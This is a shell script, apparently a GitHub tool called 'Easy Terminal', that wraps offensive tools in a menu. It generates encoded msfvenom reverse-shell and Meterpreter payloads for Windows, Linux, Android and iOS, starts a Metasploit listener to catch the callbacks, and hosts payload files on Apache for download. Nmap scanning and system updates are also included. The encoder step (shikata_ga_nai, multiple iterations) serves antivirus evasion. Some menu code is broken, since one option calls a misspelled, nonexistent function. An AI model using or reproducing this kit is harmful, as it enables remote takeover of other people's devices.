#!/bin/sh





if [ "$(id -u)" != "0" ]; then

    echo "This script must be run as root" 1>&2

    exit 1

fi



menu() {

clear

echo "  ____ _   _ _____ ____ _  _____ _   _  ____ "

echo " / ___| | | | ____/ ___| |/ /_ _| \ | |/ ___|"

echo "| |   | |_| |  _|| |   | ' / | ||  \| | |  _   _    _    _ "

echo "| |___|  _  | |__| |___| . \ | || |\  | |_| | (_)  (_)  (_)"

echo " \____|_| |_|_____\____|_|\_\___|_| \_|\____|"

echo

echo

}



menu



# Define colors



RED='\033[0;31m'



GREEN='\033[0;32m'



NC='\033[0m' # No Color







# Function to check if a command exists



check_command() {



    command -v "$1" >/dev/null 2>&1



}







# Function to check if a file exists at specific paths



check_file() {



    for path in "$@"; do



        if [ -f "$path" ]; then



            return 0



        fi



    done



    return 1



}







# Function to check for root privileges



check_root() {



    printf "Checking for root privileges: "



    if [ "$(id -u)" -eq 0 ]; then



        printf "[ ${GREEN}✔${NC} ]\n"



    else



        printf "[ ${RED}✘${NC} ]\n"



        return 1



    fi



}







# Function to check each required program



check_program() {



    printf "Checking for %-10s       " "$1":



    if check_command "$1" || check_file "$2" "$3" "$4" "$5" "$6" "$7" "$8" "$9"; then



        printf "[ ${GREEN}✔${NC} ]\n"



    else



        printf "[ ${RED}✘${NC} ]\n"



        MISSING_PROGRAMS="$MISSING_PROGRAMS $1"



    fi



}







# Check for Metasploit specifically



check_metasploit() {



    printf "Checking for Metasploit:      "



    if check_command "msfconsole" || check_file "/usr/bin/msfconsole" "/usr/local/bin/msfconsole" "/bin/msfconsole" "/usr/sbin/msfconsole" "/sbin/msfconsole"; then



        printf "[ ${GREEN}✔${NC} ]\n"



    else



        printf "[ ${RED}✘${NC} ]\n"



        MISSING_PROGRAMS="$MISSING_PROGRAMS metasploit"



    fi



}







# Start checks



echo



check_root



sleep 1







MISSING_PROGRAMS=""







check_program xterm "/usr/bin/xterm" "/usr/local/bin/xterm" "/bin/xterm" "/usr/sbin/xterm" "/sbin/xterm"



sleep 1



check_program lolcat "/usr/bin/lolcat" "/usr/local/bin/lolcat" "/bin/lolcat" "/usr/sbin/lolcat" "/sbin/lolcat"



sleep 1



check_program figlet "/usr/bin/figlet" "/usr/local/bin/figlet" "/bin/figlet" "/usr/sbin/figlet" "/sbin/figlet"



sleep 1



check_metasploit



sleep 1



check_program msfvenom "/usr/bin/msfvenom" "/usr/local/bin/msfvenom" "/bin/msfvenom" "/usr/sbin/msfvenom" "/sbin/msfvenom"







# Handle missing programs



if [ -n "$MISSING_PROGRAMS" ]; then



    echo "Some required programs are missing. Please run install.sh to install them."



    read -p "Press Enter to exit..."



    exit 1



fi







echo



echo "All required programs are installed."



echo



echo "Press Enter to continue with the script..."



read cont























# Define Colors







cyan='\e[0;36m'







Blue2='\e[0;34m'







okegreen='\033[92m'







white='\e[1;37m'







red='\e[1;31m'







yellow='\e[0;33m'







orange='\e[0;33m'















#menu







print_menu() {







    echo $Blue2"========================================================================="







    figlet "Easy Terminal" | lolcat







    echo "[---]       Welcome to Easy Terminal ( Version 1.4.2 Beta )       [---]"| lolcat 







    echo "[---] GitHub ( https://github.com/DevBO7MED/easy-terminal-script )[---]"| lolcat







    echo "[---]                    Created by:DevBO7MED                     [---]"| lolcat







    figlet "BO7MED MIX YT" | lolcat







    echo $Blue2"========================================================================="







    echo 







    echo $okegreen "    [01] Start Nmap Scan           "







    echo $okegreen "    [02] Create Payload By Msfvenom"







    echo $okegreen "    [03] Create Metasploit Listener"







    echo $okegreen "    [04] Start Nessus              "







    echo $okegreen "    [05] Start Apache2 And Upload File"







    echo $okegreen "    [06] Stop Apache2           "







    echo $okegreen "    [07] Update & Upgrade System"







    echo $okegreen "    [08] Remove System Old Files"







    echo $okegreen "    [09] Check For Updates      "







    echo $okegreen "    [10] Exit                   "







}























#show ip







show_ip_addresses() {















    echo "Your IPv4 Address:"







    echo "=============================="







    ip -4 addr show | grep eth0 | awk '{print $2}'







    echo "=============================="







}























#easy terminal update







update_script() {















    repo_url="https://github.com/DevBO7MED/easy-terminal-script"







    







    script_dir=$(dirname "$(realpath "$0")")







    







    temp_dir="/tmp/easy-terminal-update"















    echo "Updating repository..."















    







    mkdir -p "$temp_dir"















   







    echo "Cloning repository to temporary directory..."







    git clone --depth 1 $repo_url "$temp_dir" > /dev/null 2>&1















    if [ $? -ne 0 ]; then







        echo "Failed to clone the repository. Please check your internet connection and try again."







        exit 1







    fi















   







    files_to_check="install.sh eterm.sh"















    







    update_needed=0







    for file in $files_to_check; do







        if [ -f "$script_dir/$file" ] && [ -f "$temp_dir/$file" ]; then







            







            if ! cmp -s "$script_dir/$file" "$temp_dir/$file"; then







                echo "$file has been updated."







                update_needed=1







            fi







        else







            echo "$file is missing in the script directory."







            update_needed=1







        fi







    done















    if [ $update_needed -eq 1 ]; then







        echo "Updating files..."







        for file in $files_to_check; do







            if [ -f "$temp_dir/$file" ]; then







                cp "$temp_dir/$file" "$script_dir/"







            fi







        done







        echo "Files updated successfully!"







    else







        echo "No updates found for the specified files."







    fi























    rm -rf "$temp_dir"















    echo "Press [ENTER] to return to the menu."







    read cont







    clear







}







#payloads choose







payloads() {







    	clear







    	figlet "PAYLOADS" | lolcat







    	echo ""







   	echo $orange"+------------------------------------------+"







    	echo $orange"|$white [1] $yellow Windows Payloads$orange|"







   	echo $orange"|$white [2] $yellow Linux Payload$orange  |"







   	echo $orange"|$white [3] $yellow Android Paylods$orange |"







        echo $orange"|$white [4] $yellow Ios Payload$orange     |"







   	echo $orange"+------------------------------------------+"







    	echo ""







    	echo $okegreen"Choose One : ";tput sgr0







    	read payloads







    







    







    















    case $payloads in







        1)







            encoder_option







            windows_payload







            windows_msfvenom







            ;;







        2)







            encoder_option







            linux_payload







            ;;







        3)







            android_paylod







            ;;















        4)







            ios_payload







            ;;







            







        *)







            echo ""







            echo -e $red "Invalid option, choose between 1 and 10"







            clear







            payloads







            ;;







    esac







}















#paylaods for metasploit







payload_option() {







    clear







    figlet "PAYLOAD TYPE" | lolcat







    echo ""







    echo $orange"+------------------------------------------+"







    echo $orange"|$white [1] $yellow windows/meterpreter/reverse_tcp$orange     |"







    echo $orange"|$white [2] $yellow windows/meterpreter/reverse_http$orange    |"







    echo $orange"|$white [3] $yellow windows/meterpreter/reverse_https$orange   |"







    echo $orange"|$white [4] $yellow linux/x86/meterpreter/reverse_tcp$orange   |"







    echo $orange"|$white [5] $yellow linux/x64/meterpreter/reverse_tcp$orange   |"







    echo $orange"|$white [6] $yellow php/meterpreter/reverse_tcp$orange         |"







    echo $orange"|$white [7] $yellow python/meterpreter/reverse_tcp$orange      |"







    echo $orange"|$white [8] $yellow android/meterpreter/reverse_tcp$orange     |"







    echo $orange"|$white [9] $yellow ios/meterpreter/reverse_tcp$orange         |"







    echo $orange"|$white [10]$yellow unix/meterpreter/reverse_tcp$orange        |"







    echo $orange"+------------------------------------------+"







    echo ""







    echo $okegreen"Choose Payload Type: ";tput sgr0







    read payload_type







    







    







    















    case $payload_type in







        1)







            export PAYLOAD_TYPE="windows/meterpreter/reverse_tcp"







            ;;







        2)







            export PAYLOAD_TYPE="windows/meterpreter/reverse_http"







            ;;







        3)







            export PAYLOAD_TYPE="windows/meterpreter/reverse_https"







            ;;







        4)







            export PAYLOAD_TYPE="linux/x86/meterpreter/reverse_tcp"







            ;;







        5)







            export PAYLOAD_TYPE="linux/x64/meterpreter/reverse_tcp"







            ;;







        6)







            export PAYLOAD_TYPE="php/meterpreter/reverse_tcp"







            ;;







        7)







            export PAYLOAD_TYPE="python/meterpreter/reverse_tcp"







            ;;







        8)







            export PAYLOAD_TYPE="android/meterpreter/reverse_tcp"







            ;;







        9)







            export PAYLOAD_TYPE="ios/meterpreter/reverse_tcp"







            ;;







        10)







            export PAYLOAD_TYPE="unix/meterpreter/reverse_tcp"







            ;;







        *)







            echo ""







            echo -e $red "Invalid option, choose between 1 and 10"







            clear







            payload_option







            ;;







    esac







}















# msfvenom payloads for windows







windows_payload() {







    clear







    figlet "PAYLOAD TYPE" | lolcat







    echo ""







    echo $orange"+------------------------------------------+"







    echo $orange"|$white [1] $yellow windows/meterpreter/reverse_tcp$orange     |"







    echo $orange"|$white [2] $yellow windows/meterpreter/reverse_http$orange    |"







    echo $orange"|$white [3] $yellow windows/meterpreter/reverse_https$orange   |"







    echo $orange"+------------------------------------------+"







    echo ""







    echo $okegreen"Choose Payload Type: ";tput sgr0







    read windows_payload_type







    







    







    















    case $windows_payload_type in







        1)







            export windows_payload_type="windows/meterpreter/reverse_tcp"







            ;;







        2)







            export windows_payload_type="windows/meterpreter/reverse_http"







            ;;







        3)







            export windows_payload_type="windows/meterpreter/reverse_https"







            ;;















        *)







            echo ""







            echo -e $red "Invalid option, choose between 1 and 10"







            clear







            windows_payload







            ;;







    esac







}















# msfvenom payloads for linux







linux_payload() {







   clear







    figlet "PAYLOAD TYPE" | lolcat







    echo ""







    echo $orange"+------------------------------------------+"







    echo $orange"|$white [1] $yellow linux/x86/meterpreter/reverse_tcp$orange   |"







    echo $orange"|$white [2] $yellow linux/x64/meterpreter/reverse_tcp$orange   |"







    echo $orange"+------------------------------------------+"







    echo ""







    echo $okegreen"Choose Payload Type: ";tput sgr0







    read linux_payload_type







    















    case $linux_payload_type in







        1)







            







            linux_msfvenom86







            ;;







        2)







            







            linux_msfvenom64







            ;;















        *)







            echo ""







            echo -e $red "Invalid option, choose between 1 and 10"







            clear







            linux_payload







            ;;







    esac







}















# msfvenom payloads for android







android_payload() {







    clear







    figlet "ANDROID PAYLOAD TYPE" | lolcat







    echo ""







    echo $orange"+------------------------------------------+"







    echo $orange"|$white [1] $yellow android/meterpreter/reverse_tcp$orange  |"







    echo $orange"|$white [2] $yellow android/shell/reverse_tcp$orange       |"







    echo $orange"+------------------------------------------+"







    echo ""







    echo $okegreen"Choose Payload Type: "; tput sgr0







    read android_payload_type







    







    case $android_payload_type in







        1)







            export android_payload_type="android/meterpreter/reverse_tcp"







            android_msfvenom







            ;;







        2)







            export android_payload_type="android/shell/reverse_tcp"







            android_msfvenom







            ;;







        *)







            echo ""







            echo -e $red "Invalid option, choose 1 or 2"







            clear







            android_payload







            ;;







    esac







}























# msfvenom payloads for ios







ios_payload() {







    clear







    figlet "PAYLOAD TYPE" | lolcat







    echo ""







    echo $orange"+------------------------------------------+"







    echo $orange"|$white [1] $yellow ios/meterpreter/reverse_tcp$orange   |"







    echo $orange"|$white [2] $yellow ios/meterpreter/bind_tcp$orange       |"







    echo $orange"|$white [3] $yellow ios/shell/reverse_tcp$orange          |"







    echo $orange"+------------------------------------------+"







    echo ""







    echo $okegreen"Choose Payload Type: "; tput sgr0







    read ios_payload_type







    







    case $ios_payload_type in







        1)







            export ios_payload_type="ios/meterpreter/reverse_tcp"







            ios_msfvenom







            ;;







        2)







            export ios_payload_type="ios/meterpreter/bind_tcp"







            ios_msfvenom







            ;;







        3)







            export ios_payload_type="ios/shell/reverse_tcp"







            ios_msfvenom







            ;;







        *)







            echo ""







            echo -e $red "Invalid option, choose 1-3"







            clear







            ios_payload







            ;;







    esac







}















# msfvenom encoders  







encoder_option() {







    clear







    figlet "ENCODER TYPE" | lolcat







    echo ""







    echo $orange"+------------------------------------------+"







    echo $orange"|$white [1] $yellow x86/shikata_ga_nai$orange   |"







    echo $orange"|$white [2] $yellow cmd/powershell_base64$orange|"







    echo $orange"|$white [3] $yellow php/base64$orange           |"







    echo $orange"|$white [4] $yellow ruby/base64$orange          |"







    echo $orange"+------------------------------------------+"







    echo ""







    echo $okegreen"Choose Encoder Best One is \"[1]\": ";tput sgr0







    read encoder_type







    







    







    















    case $encoder_type in







        1)







            export encoder_type="x86/shikata_ga_nai"







            ;;







        2)







            export encoder_type="cmd/powershell_base64"







            ;;







        3)







            export encoder_type="php/base64"







            ;;















        4)







            export encoder_type="ruby/base64"







            ;;







            







        *)







            echo ""







            echo -e $red "Invalid option, choose between 1 and 10"







            clear







            encoder_option







            ;;







    esac







}















windows_msfvenom() {







clear







clear







figlet "M S F V E N O M" | lolcat







echo







echo







show_ip_addresses







echo







echo







read -p "Enter LHOST (e.g., \"192.168.1.5\") " H







echo







read -p "Enter LPORT (e.g., \"4444\") " P







echo







read -p "Enter Payload Format (e.g., \"exe\") " format







echo







read -p "Enter The Numbers to run the encoder (e.g., \"5\") " NUMBER







echo







read -p "Enter Payload save path (e.g., \"/home/kali\"): " S







echo







read -p "Enter Payload name (e.g., \"Payload.exe\"): " name







echo







read -p "Choose x86 Bit Payload or x64 Bit Payload (e.g., \"x86\") " ARK







echo







echo    "Creating Payload..."







echo







msfvenom -p $windows_payload_type --platform windows LHOST=$H LPORT=$P -a $ARK -f $format -e $encoder_type -i $NUMBER -o $S/$name







if [ $? -eq 0 ]; then







                clear







                figlet "M S F V E N O M" | lolcat







                echo







                echo







                echo







                echo







                echo "Payload created successfully!"







                echo







                echo







                echo "Payload Path: $S/$name"







             else







                clear







                figlet "M S F V E N O M" | lolcat







                echo







                echo







                echo







                echo







                echo "Error: invalid options try again with correct options."







            fi







            echo







            echo







            echo "Press [ENTER] to return to the menu."







            read cont







  







}















linux_msfvenom64() {







echo







echo







echo







show_ip_addresses







echo







echo







read -p "Enter LHOST (e.g., \"192.168.1.5\") " H1







echo







read -p "Enter LPORT (e.g., \"4444\") " P1







echo







read -p "Enter Payload Format (e.g., \"sh\") " format1







echo







read -p "Enter The Numbers to run the encoder (e.g., \"5\") " NUMBER1







echo







read -p "Enter Payload save path (e.g., \"/home/kali\"): " S1







echo







read -p "Enter Payload name (e.g., \"Payload.sh\"): " name1







echo







echo    "Creating Payload..."







echo







msfvenom -p linux/x64/meterpreter/reverse_tcp --platform Linux LHOST=$H1 LPORT=$P1 -a x64 -f $format1 -e $encoder_type -i $NUMBER1 -o $S1/$name1







if [ $? -eq 0 ]; then







                clear







                figlet "M S F V E N O M" | lolcat







                echo







                echo







                echo







                echo







                echo "Payload created successfully!"







                echo







                echo







                echo "Payload Path: $S1/$name1"







             else







                clear







                figlet "M S F V E N O M" | lolcat







                echo







                echo







                echo







                echo







                echo "Error: invalid options try again with correct options."







            fi







            echo







            echo







            echo "Press [ENTER] to return to the menu."







            read cont







            







}















linux_msfvenom86() {







echo







echo







echo







show_ip_addresses







echo







echo







read -p "Enter LHOST (e.g., \"192.168.1.5\") " H2







echo







read -p "Enter LPORT (e.g., \"4444\") " P2







echo







read -p "Enter Payload Format (e.g., \"sh\") " format2







echo







read -p "Enter The Numbers to run the encoder (e.g., \"5\") " NUMBER2







echo







read -p "Enter Payload save path (e.g., \"/home/kali\"): " S2







echo







read -p "Enter Payload name (e.g., \"Payload.sh\"): " name2







echo







echo    "Creating Payload..."







echo







msfvenom -p linux/x86/meterpreter/reverse_tcp --platform Linux LHOST=$H2 LPORT=$P2 -a x86 -f $format2 -e $encoder_type -i $NUMBER2 -o $S2/$name2







if [ $? -eq 0 ]; then







                clear







                figlet "M S F V E N O M" | lolcat







                echo







                echo







                echo







                echo







                echo "Payload created successfully!"







                echo







                echo







                echo "Payload Path: $S2/$name2"







             else







                clear







                figlet "M S F V E N O M" | lolcat







                echo







                echo







                echo







                echo







                echo "Error: invalid options try again with correct options."







            fi







            echo







            echo







            echo "Press [ENTER] to return to the menu."







            read cont







}















ios_msfvenom() {







    echo







    echo







    echo







    show_ip_addresses







    echo







    echo







    read -p "Enter LHOST (e.g., \"192.168.1.5\") " H3







    echo







    read -p "Enter LPORT (e.g., \"4444\") " P3







    echo







    read -p "Enter Payload Format (e.g., \"macho\") " format3







    echo







    read -p "Enter Payload save path (e.g., \"/home/kali\"): " S3







    echo







    read -p "Enter Payload name (e.g., \"Payload.macho\"): " name3







    echo







    echo    "Creating Payload..."







    echo







    msfvenom -p $ios_payload_type LHOST=$H3 LPORT=$P3 -f $format3 -o $S3/$name3















    if [ $? -eq 0 ]; then







        clear







        figlet "M S F V E N O M" | lolcat







        echo







        echo







        echo "Payload created successfully!"







        echo







        echo "Payload Path: $S3/$name3"







    else







        clear







        figlet "M S F V E N O M" | lolcat







        echo "Error: invalid options try again with correct options."







    fi







    echo







    echo "Press [ENTER] to return to the menu."







    read cont







}















android_msfvenom() {







    echo







    echo







    echo







    show_ip_addresses







    echo







    echo







    read -p "Enter LHOST (e.g., \"192.168.1.5\") " H4







    echo







    read -p "Enter LPORT (e.g., \"4444\") " P4







    echo







    read -p "Enter Payload save path (e.g., \"/home/kali\"): " S4







    echo







    read -p "Enter Payload name (e.g., \"Payload.apk\"): " name4







    echo







    echo    "Creating Payload..."







    echo







    msfvenom -p $android_payload_type LHOST=$H4 LPORT=$P4 -o $S4/$name4















    if [ $? -eq 0 ]; then







        clear







        figlet "M S F V E N O M" | lolcat







        echo







        echo







        echo "Payload created successfully!"







        echo







        echo "Payload Path: $S4/$name4"







    else







        clear







        figlet "M S F V E N O M" | lolcat







        echo "Error: invalid options try again with correct options."







    fi







    echo







    echo "Press [ENTER] to return to the menu."







    read cont







}















# nmap options







nmap_options() {







    clear







    figlet "N M A P" | lolcat 







    echo ""







    echo $orange"+------------------------------------------+"







    echo $orange"|$white [1] $yellow Basic Scan$orange                          |"







    echo $orange"|$white [2] $yellow Version Detection$orange                   |"







    echo $orange"|$white [3] $yellow OS Detection$orange                        |"







    echo $orange"|$white [4] $yellow All Scan$orange                            |"







    echo $orange"+------------------------------------------+"







    echo ""







    echo $okegreen"Choose Scan Type: ";tput sgr0







    read scan_type















    case $scan_type in







        1)







            scan_args="-sS -O -Pn -sV -p-"







            ;;







        2)







            scan_args="-sV"







            ;;







        3)







            scan_args="-O"







            ;;







        4)







            scan_args="-sS -O -Pn -sV -p-"







            ;;







        *)







            echo ""







            echo $red "Invalid option, choose between 1 and 4"







            clear







            nmap_options







            ;;







    esac







}















execute_option() {







    case $1 in







        1)  







            echo







            nmap_options







            echo







            read -p "Enter Target IP or URL: " IP







            echo







            sudo nmap $scan_args $IP







            echo ""







            echo $okegreen"Press [ENTER] to return to the menu."







            read cont







            clear







            ;;







        2)







          payloads







          ;;







        







        3)  







            echo







            payload_option







            clear







            figlet "METASPLOIT" | lolcat







            echo







            show_ip_addresses







            echo







            read -p "Enter LHOST \"IP\" (e.g., \"192.168.1.5\"): " LHOST







            echo







            read -p "Enter LPORT \"Port\" (e.g., \"4444\"): " LPORT







            echo







            sudo service postgresql start







            echo







            sudo msfdb init







            echo







            xterm -fa monaco -fs 13 -bg black -e "echo 'Starting Metasploit Listener...';msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $PAYLOAD_TYPE; set LHOST $LHOST; set LPORT $LPORT; exploit'" &







            clear







            ;;







        4)  







            figlet "N E S S U S" | lolcat







            echo







            echo







            echo







            echo







            sudo service nessusd start







            if [ $? -eq 0 ]; then







               clear







               figlet "N E S S U S" | lolcat







               echo







               echo







               echo







               echo







               echo "Nessus service started Successfully You Can Now Open This Link To Start Nessus \"http://localhost:8834\""







            else







               clear







               figlet "N E S S U S" | lolcat







               echo







               echo







               echo







               echo







               echo "Nessus service failed to start try again later"







            fi







            echo







            echo







            echo "Press [ENTER] to return to the menu."







            read cont







            clear







            ;;







        5)  







            clear







            figlet "A P A C H E 2" | lolcat







            echo







            echo







            echo "Starting Apache2..."







            echo







            sudo service apache2 start







            clear







            figlet "A P A C H E 2" | lolcat 







            echo







            echo







            read -p "Enter File Location To Upload (e.g., \"/home/kali/example.exe\"): " FL







            echo







            read -p "Enter File Name For The Uploaded File (e.g., \"/example.exe\"): " N







            echo







            sudo cp $FL /var/www/html/$N







            if [ $? -eq 0 ]; then







                echo







                clear







                figlet "A P A C H E 2" | lolcat







                echo







                echo







                echo







                echo







                echo "Started And Uploaded successfully"







            else







                echo







                clear







                figlet "A P A C H E 2" | lolcat







                echo







                echo







                echo







                echo







                echo "Faild To Upload The file No such file or directory"







            fi







            echo







            echo







            echo "Press [ENTER] to return to the menu."







            read cont







            clear







            ;;







        6)  







            clear







            figlet "A P A C H E 2" | lolcat







            echo







            echo







            echo







            echo







            echo "Stopping Apache2..."







            echo







            echo







            sudo service apache2 stop







            if [ $? -eq 0 ]; then







                clear







                figlet "A P A C H E 2" | lolcat







                echo







                echo







                echo







                echo







                echo "Service Apache2 stopped Successfully."







                echo







                echo







                echo "Press [ENTER] to return to the menu."







                read cont







            else







                clear







                figlet "A P A C H E 2" | lolcat







                echo







                echo







                echo







                echo







                echo "Service Apache2 Failed To stop"







            echo







            echo







            echo "Press [ENTER] to return to the menu."







            read cont







            clear







            fi







            ;;







        7)  







            clear







            figlet "UPDATING SYSTEM" | lolcat







            echo







            echo







            echo







            echo







            echo







            sudo apt-get update && sudo apt-get upgrade -y







            if [ $? -eq 0 ]; then







                clear







                figlet "UPDATING SYSTEM" | lolcat







                echo







                echo







                echo







                echo







                echo "System Updated And Upgraded Successfully."







            else







                clear







                figlet "UPDATING SYSTEM" | lolcat







                echo







                echo







                echo







                echo







                echo "System Failed To Update And Upgrade Try Again later"







            fi







            echo







            echo







            echo "Press [ENTER] to return to the menu."







            read cont







            clear







            ;;







        8)  







            clear



            figlet "R E M O V I N G" | lolcat







            echo







            echo







            echo







            echo







            echo "Removing old system files..."







            echo







            echo







            sudo apt-get autoremove -y







            echo







            echo







            echo "Old files removed."







            echo







            echo







            echo "Press [ENTER] to return to the menu."







            read cont







            clear







            ;;







        9)  







            clear







            figlet "UPDATING ETERMINAL" | lolcat







            update_script







            ;;







        10) 







            echo "Exiting..."







            exit







            ;;







        *)







            clear







            echo ""







            echo $red"Invalid option, choose between 1 and 10"







            sleep 3







            clear







            ;;







    esac







}















while true; do







    clear







    print_menu







    echo







    echo $okegreen"┌─["$red"EasyTerminal$okegreen]──[$red~$okegreen]"







    read -p "└─────► " choice







    execute_option $choice







done







